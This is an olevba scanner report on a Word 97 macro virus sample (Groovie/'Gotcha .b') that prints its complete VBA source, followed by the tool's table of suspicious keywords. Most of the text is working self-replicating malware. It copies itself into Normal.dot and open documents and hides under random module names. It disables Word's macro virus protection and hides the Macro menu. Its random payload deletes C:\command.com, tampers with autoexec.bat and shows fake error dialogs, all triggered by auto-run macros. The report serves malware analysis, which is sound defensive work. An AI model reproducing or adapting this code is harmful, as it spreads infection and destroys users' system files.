olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.u-57235628e47dc298d309cdb92531140729097830
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.u-57235628e47dc298d309cdb92531140729097830 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO gotcha.bas 
in file: Virus.MSWord.Groovie.u-57235628e47dc298d309cdb92531140729097830 - OLE stream: 'Macros/VBA/gotcha'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public target As String
Public Init As Boolean
Public norminfd As Boolean
Public Docinfd As Boolean
Public Armor As Boolean
Public DocName As String
Public Scan_For_Doc As Boolean
Public Exitt_Word As Boolean
Function ID_check()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
        If MacroContainer = NormalTemplate Then
        target = "normal"
        GoTo checkout
    End If
    If MacroContainer = ActiveDocument Then target = "document"
    If MacroContainer = "Wordinit.dot" Then target = "Trix"
checkout:
End Function
Function Vir_status()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
If Dir(Application.StartupPath + "\Wordinit.dot") = "Wordinit.dot" Then Init = True
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "gotcha" Then Docinfd = True
    Next I
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(I).Name = "gotcha" Then norminfd = True
    Next I
    If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
End Function
Function Gotcha_Main()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Call ID_check
Call Vir_status
Call Export_Status
    If target = "document" Then Call Docinf_code
    If target = "normal" Then Call Norminf_code
    If target = "Trix" Then Call Trix_code
    If Armor = False Then CommandBars("tools").Controls("Macro").Delete
    If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Function
Function Export_Status()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
End Function
Function Docinf_code()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
    If norminfd = False And Armor = False Then
        With NormalTemplate.VBProject
        With .VBComponents.Import("C:\confg.sys")
        End With
        End With
    End If
    Init = False

    If Init = False Then
    NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
         Randomize Timer
Randomize Timer
x = Int(Rnd(1) * 26)
If x = 1 Then A$ = "A"
If x = 2 Then A$ = "B"
If x = 3 Then A$ = "C"
If x = 4 Then A$ = "D"
If x = 5 Then A$ = "E"
If x = 6 Then A$ = "F"
If x = 7 Then A$ = "G"
If x = 8 Then A$ = "H"
If x = 9 Then A$ = "I"
If x = 10 Then A$ = "J"
If x = 11 Then A$ = "K"
If x = 12 Then A$ = "L"
If x = 13 Then A$ = "M"
If x = 14 Then A$ = "N"
If x = 15 Then A$ = "O"
If x = 16 Then A$ = "P"
If x = 17 Then A$ = "Q"
If x = 18 Then A$ = "R"
If x = 19 Then A$ = "S"
If x = 20 Then A$ = "T"
If x = 21 Then A$ = "U"
If x = 22 Then A$ = "V"
If x = 23 Then A$ = "W"
If x = 24 Then A$ = "X"
If x = 25 Then A$ = "Y"
If x = 26 Then A$ = "Z"
s = Int(Rnd(1) * 26)
If s = 1 Then C$ = "A"
If s = 2 Then C$ = "B"
If s = 3 Then C$ = "C"
If s = 4 Then C$ = "D"
If s = 5 Then C$ = "E"
If s = 6 Then C$ = "F"
If s = 7 Then C$ = "G"
If s = 8 Then C$ = "H"
If s = 9 Then C$ = "I"
If s = 10 Then C$ = "J"
If s = 11 Then C$ = "K"
If s = 12 Then C$ = "L"
If s = 13 Then C$ = "M"
If s = 14 Then C$ = "N"
If s = 15 Then C$ = "O"
If s = 16 Then C$ = "P"
If s = 17 Then C$ = "Q"
If s = 18 Then C$ = "R"
If s = 19 Then C$ = "S"
If s = 20 Then C$ = "T"
If s = 21 Then C$ = "U"
If s = 22 Then C$ = "V"
If s = 23 Then C$ = "W"
If s = 24 Then C$ = "X"
If s = 25 Then C$ = "Y"
If s = 26 Then C$ = "Z"
q = Int(Rnd(1) * 26)
If q = 1 Then D$ = "A"
If q = 2 Then D$ = "B"
If q = 3 Then D$ = "C"
If q = 4 Then D$ = "D"
If q = 5 Then D$ = "E"
If q = 6 Then D$ = "F"
If q = 7 Then D$ = "G"
If q = 8 Then D$ = "H"
If q = 9 Then D$ = "I"
If q = 10 Then D$ = "J"
If q = 11 Then D$ = "K"
If q = 12 Then D$ = "L"
If q = 13 Then D$ = "M"
If q = 14 Then D$ = "N"
If q = 15 Then D$ = "O"
If q = 16 Then D$ = "P"
If q = 17 Then D$ = "Q"
If q = 18 Then D$ = "R"
If q = 19 Then D$ = "S"
If q = 20 Then D$ = "T"
If q = 21 Then D$ = "U"
If q = 22 Then D$ = "V"
If q = 23 Then D$ = "W"
If q = 24 Then D$ = "X"
If q = 25 Then D$ = "Y"
If q = 26 Then D$ = "Z"
w = Int(Rnd(1) * 26)
If w = 1 Then E$ = "A"
If w = 2 Then E$ = "B"
If w = 3 Then E$ = "C"
If w = 4 Then E$ = "D"
If w = 5 Then E$ = "E"
If w = 6 Then E$ = "F"
If w = 7 Then E$ = "G"
If w = 8 Then E$ = "H"
If w = 9 Then E$ = "I"
If w = 10 Then E$ = "J"
If w = 11 Then E$ = "K"
If w = 12 Then E$ = "L"
If w = 13 Then E$ = "M"
If w = 14 Then E$ = "N"
If w = 15 Then E$ = "O"
If w = 16 Then E$ = "P"
If w = 17 Then E$ = "Q"
If w = 18 Then E$ = "R"
If w = 19 Then E$ = "S"
If w = 20 Then E$ = "T"
If w = 21 Then E$ = "U"
If w = 22 Then E$ = "V"
If w = 23 Then E$ = "W"
If w = 24 Then E$ = "X"
If w = 25 Then E$ = "Y"
If w = 26 Then E$ = "Z"
y = Int(Rnd(1) * 26)
If y = 1 Then F$ = "A"
If y = 2 Then F$ = "B"
If y = 3 Then F$ = "C"
If y = 4 Then F$ = "D"
If y = 5 Then F$ = "E"
If y = 6 Then F$ = "F"
If y = 7 Then F$ = "G"
If y = 8 Then F$ = "H"
If y = 9 Then F$ = "I"
If y = 10 Then F$ = "J"
If y = 11 Then F$ = "K"
If y = 12 Then F$ = "L"
If y = 13 Then F$ = "M"
If y = 14 Then F$ = "N"
If y = 15 Then F$ = "O"
If y = 16 Then F$ = "P"
If y = 17 Then F$ = "Q"
If y = 18 Then F$ = "R"
If y = 19 Then F$ = "S"
If y = 20 Then F$ = "T"
If y = 21 Then F$ = "U"
If y = 22 Then F$ = "V"
If y = 23 Then F$ = "W"
If y = 24 Then F$ = "X"
If y = 25 Then F$ = "Y"
If y = 26 Then F$ = "Z"
t = Int(Rnd(1) * 26)
If t = 1 Then G$ = "A"
If t = 2 Then G$ = "B"
If t = 3 Then G$ = "C"
If t = 4 Then G$ = "D"
If t = 5 Then G$ = "E"
If t = 6 Then G$ = "F"
If t = 7 Then G$ = "G"
If t = 8 Then G$ = "H"
If t = 9 Then G$ = "I"
If t = 10 Then G$ = "J"
If t = 11 Then G$ = "K"
If t = 12 Then G$ = "L"
If t = 13 Then G$ = "M"
If t = 14 Then G$ = "N"
If t = 15 Then G$ = "O"
If t = 16 Then G$ = "P"
If t = 17 Then G$ = "Q"
If t = 18 Then G$ = "R"
If t = 19 Then G$ = "S"
If t = 20 Then G$ = "T"
If t = 21 Then G$ = "U"
If t = 22 Then G$ = "V"
If t = 23 Then G$ = "W"
If t = 24 Then G$ = "X"
If t = 25 Then G$ = "Y"
If t = 26 Then G$ = "Z"
B$ = A$ + C$ + D$ + E$ + F$ + G$
        Application.OrganizerRename Source:=Application.StartupPath + "\Wordinit.dot", Name:="gotcha", NewName:=B$, Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        If Exitt_Word = False Then Documents.Open FileName:=DocName
        Windows(1).Close
    End If
End Function
Function Norminf_code()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.ScreenUpdating = False
    Call Check_For_Doc
    If Docinfd = False And Scan_For_Doc = True Then
        With ActiveDocument.VBProject
        With .VBComponents.Import("C:\confg.sys")
        End With
        End With
    End If
    If Init = False And Scan_For_Doc = True Then
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
                ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Randomize Timer
x = Int(Rnd(1) * 26)
If x = 1 Then A$ = "A"
If x = 2 Then A$ = "B"
If x = 3 Then A$ = "C"
If x = 4 Then A$ = "D"
If x = 5 Then A$ = "E"
If x = 6 Then A$ = "F"
If x = 7 Then A$ = "G"
If x = 8 Then A$ = "H"
If x = 9 Then A$ = "I"
If x = 10 Then A$ = "J"
If x = 11 Then A$ = "K"
If x = 12 Then A$ = "L"
If x = 13 Then A$ = "M"
If x = 14 Then A$ = "N"
If x = 15 Then A$ = "O"
If x = 16 Then A$ = "P"
If x = 17 Then A$ = "Q"
If x = 18 Then A$ = "R"
If x = 19 Then A$ = "S"
If x = 20 Then A$ = "T"
If x = 21 Then A$ = "U"
If x = 22 Then A$ = "V"
If x = 23 Then A$ = "W"
If x = 24 Then A$ = "X"
If x = 25 Then A$ = "Y"
If x = 26 Then A$ = "Z"
s = Int(Rnd(1) * 26)
If s = 1 Then C$ = "A"
If s = 2 Then C$ = "B"
If s = 3 Then C$ = "C"
If s = 4 Then C$ = "D"
If s = 5 Then C$ = "E"
If s = 6 Then C$ = "F"
If s = 7 Then C$ = "G"
If s = 8 Then C$ = "H"
If s = 9 Then C$ = "I"
If s = 10 Then C$ = "J"
If s = 11 Then C$ = "K"
If s = 12 Then C$ = "L"
If s = 13 Then C$ = "M"
If s = 14 Then C$ = "N"
If s = 15 Then C$ = "O"
If s = 16 Then C$ = "P"
If s = 17 Then C$ = "Q"
If s = 18 Then C$ = "R"
If s = 19 Then C$ = "S"
If s = 20 Then C$ = "T"
If s = 21 Then C$ = "U"
If s = 22 Then C$ = "V"
If s = 23 Then C$ = "W"
If s = 24 Then C$ = "s"
If s = 25 Then C$ = "Y"
If s = 26 Then C$ = "Z"
q = Int(Rnd(1) * 26)
If q = 1 Then D$ = "A"
If q = 2 Then D$ = "B"
If q = 3 Then D$ = "C"
If q = 4 Then D$ = "D"
If q = 5 Then D$ = "E"
If q = 6 Then D$ = "F"
If q = 7 Then D$ = "G"
If q = 8 Then D$ = "H"
If q = 9 Then D$ = "I"
If q = 10 Then D$ = "J"
If q = 11 Then D$ = "K"
If q = 12 Then D$ = "L"
If q = 13 Then D$ = "M"
If q = 14 Then D$ = "N"
If q = 15 Then D$ = "O"
If q = 16 Then D$ = "P"
If q = 17 Then D$ = "Q"
If q = 18 Then D$ = "R"
If q = 19 Then D$ = "S"
If q = 20 Then D$ = "T"
If q = 21 Then D$ = "U"
If q = 22 Then D$ = "V"
If q = 23 Then D$ = "W"
If q = 24 Then D$ = "X"
If q = 25 Then D$ = "Y"
If q = 26 Then D$ = "Z"
w = Int(Rnd(1) * 26)
If w = 1 Then E$ = "A"
If w = 2 Then E$ = "B"
If w = 3 Then E$ = "C"
If w = 4 Then E$ = "D"
If w = 5 Then E$ = "E"
If w = 6 Then E$ = "F"
If w = 7 Then E$ = "G"
If w = 8 Then E$ = "H"
If w = 9 Then E$ = "I"
If w = 10 Then E$ = "J"
If w = 11 Then E$ = "K"
If w = 12 Then E$ = "L"
If w = 13 Then E$ = "M"
If w = 14 Then E$ = "N"
If w = 15 Then E$ = "O"
If w = 16 Then E$ = "P"
If w = 17 Then E$ = "Q"
If w = 18 Then E$ = "R"
If w = 19 Then E$ = "S"
If w = 20 Then E$ = "T"
If w = 21 Then E$ = "U"
If w = 22 Then E$ = "V"
If w = 23 Then E$ = "W"
If w = 24 Then E$ = "X"
If w = 25 Then E$ = "Y"
If w = 26 Then E$ = "Z"
y = Int(Rnd(1) * 26)
If y = 1 Then F$ = "A"
If y = 2 Then F$ = "B"
If y = 3 Then F$ = "C"
If y = 4 Then F$ = "D"
If y = 5 Then F$ = "E"
If y = 6 Then F$ = "F"
If y = 7 Then F$ = "G"
If y = 8 Then F$ = "H"
If y = 9 Then F$ = "I"
If y = 10 Then F$ = "J"
If y = 11 Then F$ = "K"
If y = 12 Then F$ = "L"
If y = 13 Then F$ = "M"
If y = 14 Then F$ = "N"
If y = 15 Then F$ = "O"
If y = 16 Then F$ = "P"
If y = 17 Then F$ = "Q"
If y = 18 Then F$ = "R"
If y = 19 Then F$ = "S"
If y = 20 Then F$ = "T"
If y = 21 Then F$ = "U"
If y = 22 Then F$ = "V"
If y = 23 Then F$ = "W"
If y = 24 Then F$ = "X"
If y = 25 Then F$ = "Y"
If y = 26 Then F$ = "Z"
t = Int(Rnd(1) * 26)
If t = 1 Then G$ = "A"
If t = 2 Then G$ = "B"
If t = 3 Then G$ = "C"
If t = 4 Then G$ = "D"
If t = 5 Then G$ = "E"
If t = 6 Then G$ = "F"
If t = 7 Then G$ = "G"
If t = 8 Then G$ = "H"
If t = 9 Then G$ = "I"
If t = 10 Then G$ = "J"
If t = 11 Then G$ = "K"
If t = 12 Then G$ = "L"
If t = 13 Then G$ = "M"
If t = 14 Then G$ = "N"
If t = 15 Then G$ = "O"
If t = 16 Then G$ = "P"
If t = 17 Then G$ = "Q"
If t = 18 Then G$ = "R"
If t = 19 Then G$ = "S"
If t = 20 Then G$ = "T"
If t = 21 Then G$ = "U"
If t = 22 Then G$ = "V"
If t = 23 Then G$ = "W"
If t = 24 Then G$ = "X"
If t = 25 Then G$ = "Y"
If t = 26 Then G$ = "Z"
B$ = A$ + C$ + D$ + E$ + F$ + G$
        Application.OrganizerRename Source:=Application.StartupPath + "\Wordinit.dot", Name:="gotcha", NewName:=B$, Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If Exitt_Word = False Then Documents.Open FileName:=DocName
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
    If Init = False And Scan_For_Doc = False Then
    NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
    ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
    Documents.Add template:="", NewTemplate:=False
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Randomize Timer
x = Int(Rnd(1) * 26)
If x = 1 Then A$ = "A"
If x = 2 Then A$ = "B"
If x = 3 Then A$ = "C"
If x = 4 Then A$ = "D"
If x = 5 Then A$ = "E"
If x = 6 Then A$ = "F"
If x = 7 Then A$ = "G"
If x = 8 Then A$ = "H"
If x = 9 Then A$ = "I"
If x = 10 Then A$ = "J"
If x = 11 Then A$ = "K"
If x = 12 Then A$ = "L"
If x = 13 Then A$ = "M"
If x = 14 Then A$ = "N"
If x = 15 Then A$ = "O"
If x = 16 Then A$ = "P"
If x = 17 Then A$ = "Q"
If x = 18 Then A$ = "R"
If x = 19 Then A$ = "S"
If x = 20 Then A$ = "T"
If x = 21 Then A$ = "U"
If x = 22 Then A$ = "V"
If x = 23 Then A$ = "W"
If x = 24 Then A$ = "X"
If x = 25 Then A$ = "Y"
If x = 26 Then A$ = "Z"
s = Int(Rnd(1) * 26)
If s = 1 Then C$ = "A"
If s = 2 Then C$ = "B"
If s = 3 Then C$ = "C"
If s = 4 Then C$ = "D"
If s = 5 Then C$ = "E"
If s = 6 Then C$ = "F"
If s = 7 Then C$ = "G"
If s = 8 Then C$ = "H"
If s = 9 Then C$ = "I"
If s = 10 Then C$ = "J"
If s = 11 Then C$ = "K"
If s = 12 Then C$ = "L"
If s = 13 Then C$ = "M"
If s = 14 Then C$ = "N"
If s = 15 Then C$ = "O"
If s = 16 Then C$ = "P"
If s = 17 Then C$ = "Q"
If s = 18 Then C$ = "R"
If s = 19 Then C$ = "S"
If s = 20 Then C$ = "T"
If s = 21 Then C$ = "U"
If s = 22 Then C$ = "V"
If s = 23 Then C$ = "W"
If s = 24 Then C$ = "s"
If s = 25 Then C$ = "Y"
If s = 26 Then C$ = "Z"
q = Int(Rnd(1) * 26)
If q = 1 Then D$ = "A"
If q = 2 Then D$ = "B"
If q = 3 Then D$ = "C"
If q = 4 Then D$ = "D"
If q = 5 Then D$ = "E"
If q = 6 Then D$ = "F"
If q = 7 Then D$ = "G"
If q = 8 Then D$ = "H"
If q = 9 Then D$ = "I"
If q = 10 Then D$ = "J"
If q = 11 Then D$ = "K"
If q = 12 Then D$ = "L"
If q = 13 Then D$ = "M"
If q = 14 Then D$ = "N"
If q = 15 Then D$ = "O"
If q = 16 Then D$ = "P"
If q = 17 Then D$ = "Q"
If q = 18 Then D$ = "R"
If q = 19 Then D$ = "S"
If q = 20 Then D$ = "T"
If q = 21 Then D$ = "U"
If q = 22 Then D$ = "V"
If q = 23 Then D$ = "W"
If q = 24 Then D$ = "X"
If q = 25 Then D$ = "Y"
If q = 26 Then D$ = "Z"
w = Int(Rnd(1) * 26)
If w = 1 Then E$ = "A"
If w = 2 Then E$ = "B"
If w = 3 Then E$ = "C"
If w = 4 Then E$ = "D"
If w = 5 Then E$ = "E"
If w = 6 Then E$ = "F"
If w = 7 Then E$ = "G"
If w = 8 Then E$ = "H"
If w = 9 Then E$ = "I"
If w = 10 Then E$ = "J"
If w = 11 Then E$ = "K"
If w = 12 Then E$ = "L"
If w = 13 Then E$ = "M"
If w = 14 Then E$ = "N"
If w = 15 Then E$ = "O"
If w = 16 Then E$ = "P"
If w = 17 Then E$ = "Q"
If w = 18 Then E$ = "R"
If w = 19 Then E$ = "S"
If w = 20 Then E$ = "T"
If w = 21 Then E$ = "U"
If w = 22 Then E$ = "V"
If w = 23 Then E$ = "W"
If w = 24 Then E$ = "X"
If w = 25 Then E$ = "Y"
If w = 26 Then E$ = "Z"
y = Int(Rnd(1) * 26)
If y = 1 Then F$ = "A"
If y = 2 Then F$ = "B"
If y = 3 Then F$ = "C"
If y = 4 Then F$ = "D"
If y = 5 Then F$ = "E"
If y = 6 Then F$ = "F"
If y = 7 Then F$ = "G"
If y = 8 Then F$ = "H"
If y = 9 Then F$ = "I"
If y = 10 Then F$ = "J"
If y = 11 Then F$ = "K"
If y = 12 Then F$ = "L"
If y = 13 Then F$ = "M"
If y = 14 Then F$ = "N"
If y = 15 Then F$ = "O"
If y = 16 Then F$ = "P"
If y = 17 Then F$ = "Q"
If y = 18 Then F$ = "R"
If y = 19 Then F$ = "S"
If y = 20 Then F$ = "T"
If y = 21 Then F$ = "U"
If y = 22 Then F$ = "V"
If y = 23 Then F$ = "W"
If y = 24 Then F$ = "X"
If y = 25 Then F$ = "Y"
If y = 26 Then F$ = "Z"
t = Int(Rnd(1) * 26)
If t = 1 Then G$ = "A"
If t = 2 Then G$ = "B"
If t = 3 Then G$ = "C"
If t = 4 Then G$ = "D"
If t = 5 Then G$ = "E"
If t = 6 Then G$ = "F"
If t = 7 Then G$ = "G"
If t = 8 Then G$ = "H"
If t = 9 Then G$ = "I"
If t = 10 Then G$ = "J"
If t = 11 Then G$ = "K"
If t = 12 Then G$ = "L"
If t = 13 Then G$ = "M"
If t = 14 Then G$ = "N"
If t = 15 Then G$ = "O"
If t = 16 Then G$ = "P"
If t = 17 Then G$ = "Q"
If t = 18 Then G$ = "R"
If t = 19 Then G$ = "S"
If t = 20 Then G$ = "T"
If t = 21 Then G$ = "U"
If t = 22 Then G$ = "V"
If t = 23 Then G$ = "W"
If t = 24 Then G$ = "X"
If t = 25 Then G$ = "Y"
If t = 26 Then G$ = "Z"
B$ = A$ + C$ + D$ + E$ + F$ + G$
        Application.OrganizerRename Source:=Application.StartupPath + "\Wordinit.dot", Name:="gotcha", NewName:=B$, Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Wordinit.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
Application.ScreenUpdating = True
End Function
Function Trix_code()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.ScreenUpdating = False
        If norminfd = False And Armor = False Then
           Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
            With NormalTemplate.VBProject
            With .VBComponents.Import("C:\confg.sys")
            End With
            End With
            NormalTemplate.Save
        End If
        If Docinfd = False Then
        NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
        ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
        Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
            With ActiveDocument.VBProject
            With .VBComponents.Import("C:\confg.sys")
            End With
            End With
            End If
Application.ScreenUpdating = True
End Function
Function Gotcha_Payload()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    DocName = ActiveDocument.FullName
    Call Gotcha_Main
    Randomize Timer
    girl = Int(Rnd(1) * 300) + 1
    If girl = 2 Then
    MsgBox "W97M.Gotcha .b Variant", 48, "Trix"
    End If
    If girl = 13 Then
    MsgBox "An error has occured.  Save all documents and restart Microsoft Word", 48, "Microsoft Word"
    End If
    If girl = 69 Then
    Open "C:\autoexec.bat" For Append As #1
    Print #1, "Echo GOTCHA!"
    Close #1
    End If
    If girl = 100 Then
    Open "C:\windows\gotcha.dll" For Append As #1
    Print #1, "W97M.Gotcha .b Variant for Word 97"
    Print #1, ".b strain created by Trix"
    Print #1, "for your personal enjoyment"
    Print #1, "Have a Nice Day....I know I'm having fun"
    Print #1, "             GOTCHA               "
    Print #1, ""
    Close #1
    End If
    If girl = 122 Then
    Open "C:\windows\err.sys" For Append As #1
    Print #1, "based off of groovie.a with a twist of Trix®"
    Print #1, ""
    Close #1
    End If
    If girl = 200 Then
    MsgBox "...........", 6, "*nŽšíjºÄt¯&ˆ9 ÉqeiÔ™"
    End If
    If girl = 220 Then
    Kill "C:\command.com"
    MsgBox "A fatal error has occured at FFEE:FFFF.  Save all documents and close Microsoft Word", 16, "Microsoft Word"
    End If
    If girl = 300 Then
    SendKeys "Gotcha"
    End If
    End Function
Sub AutoExec()
On Error Resume Next
Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"

End Sub

Sub AutoClose()
On Error Resume Next
Exitt_Word = True
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Call Gotcha_Payload
End Sub
Sub AutoExit()
 On Error Resume Next
Exitt_Word = True
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Call Gotcha_Payload
End Sub
Sub FileSaveAs()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Dialogs(wdDialogFileSaveAs).Show
Call Gotcha_Payload
WordBasic.filesave
End Sub
Sub filesave()
On Error Resume Next
NormalTemplate.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBComponents("gotcha").Export ("C:\confg.sys")
ActiveDocument.VBProject.VBE.ActiveVBProject.VBComponents("gotcha").Export "C:\confg.sys"
Application.VBE.ActiveVBProject.VBCo
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBProject.VBE       |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |gotcha.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

